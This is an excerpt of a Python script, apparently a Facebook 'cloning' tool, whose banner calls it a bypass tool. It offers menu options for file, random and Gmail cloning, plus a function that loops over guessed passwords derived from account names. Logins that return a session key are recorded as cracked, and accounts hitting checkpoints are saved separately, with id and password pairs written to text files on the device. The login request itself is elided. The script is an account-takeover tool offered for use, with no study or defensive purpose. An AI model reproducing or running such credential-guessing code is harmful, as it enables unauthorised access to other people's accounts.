...
[%]TOOL    : FILE CLONER 
[%]VERSION : 1.0
[%]STATUS  : BYPASS TOOL WALE BARWHA DE BHAI
...
def faraz():
	clear()
	#ckx()
	print(f" \33[1;92m[1] File Cloone ")
	print(f" [2] BD Random Cloner ")
	print(f" \33[1;91m[2] Gmail Cloning")
	print(f" [0] Exit")
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [SAPNA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SAPNA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SAPNA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [SAPNA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/SAPNA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
